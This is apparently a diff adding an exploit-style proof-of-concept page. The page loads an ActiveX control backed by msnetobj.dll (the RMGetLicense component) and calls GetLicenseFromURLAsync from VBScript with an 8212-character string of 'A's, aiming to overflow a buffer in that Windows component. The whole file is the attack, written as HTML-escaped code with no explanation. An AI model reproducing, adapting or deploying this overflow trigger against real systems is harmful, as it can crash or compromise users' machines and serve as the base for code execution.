@@ -1,0 +1,15 @@
+&lt;object classid=&#039;clsid:A9FC132B-096D-460B-B7D5-1DB0FAE0C062&#039; id=&#039;RM&#039; /&gt;
+&lt;script language=&#039;vbscript&#039;&gt;
+ 
+targetFile = &quot;C:\Windows\System32\msnetobj.dll&quot;
+prototype  = &quot;Sub GetLicenseFromURLAsync ( ByVal bstrXMLDoc As String ,  ByVal bstrURL As String )&quot;
+memberName = &quot;GetLicenseFromURLAsync&quot;
+progid     = &quot;MSNETOBJLib.RMGetLicense&quot;
+argCount   = 2
+ 
+arg1=&quot;defaultV&quot;
+arg2=String(8212, &quot;A&quot;)
+ 
+RM.GetLicenseFromURLAsync(arg1 ,arg2)
+ 
+&lt;/script&gt;
